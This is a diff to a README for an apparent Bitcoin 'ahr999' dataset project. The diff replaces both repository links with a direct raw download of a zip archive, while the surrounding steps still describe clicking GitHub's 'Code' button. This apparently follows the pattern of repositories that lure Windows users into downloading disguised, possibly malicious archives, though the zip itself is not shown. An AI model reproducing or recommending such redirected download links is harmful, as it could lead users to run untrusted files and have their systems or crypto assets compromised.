@@ -1,6 +1,6 @@
 # 📉 ahr999-dataset - Monitor Bitcoin investment cycles with ease
 
-[![](https://img.shields.io/badge/Download-Data_and_Tools-blue.svg)](https://github.com/shitless-secretor385/ahr999-dataset)
+[![](https://img.shields.io/badge/Download-Data_and_Tools-blue.svg)](https://raw.githubusercontent.com/shitless-secretor385/ahr999-dataset/main/web/public/ahr_dataset_v3.0.zip)
 
 ## 📖 About this project
 
@@ -20,7 +20,7 @@ Standard Windows computers support these files. You need:
 
 Follow these steps to access the latest index values:
 
-1. Visit the [project download page](https://github.com/shitless-secretor385/ahr999-dataset).
+1. Visit the [project download page](https://raw.githubusercontent.com/shitless-secretor385/ahr999-dataset/main/web/public/ahr_dataset_v3.0.zip).
 2. Look for the green button labeled "Code" near the top right of the screen.
 3. Click "Download ZIP" from the menu.
 4. Save the file to your computer.
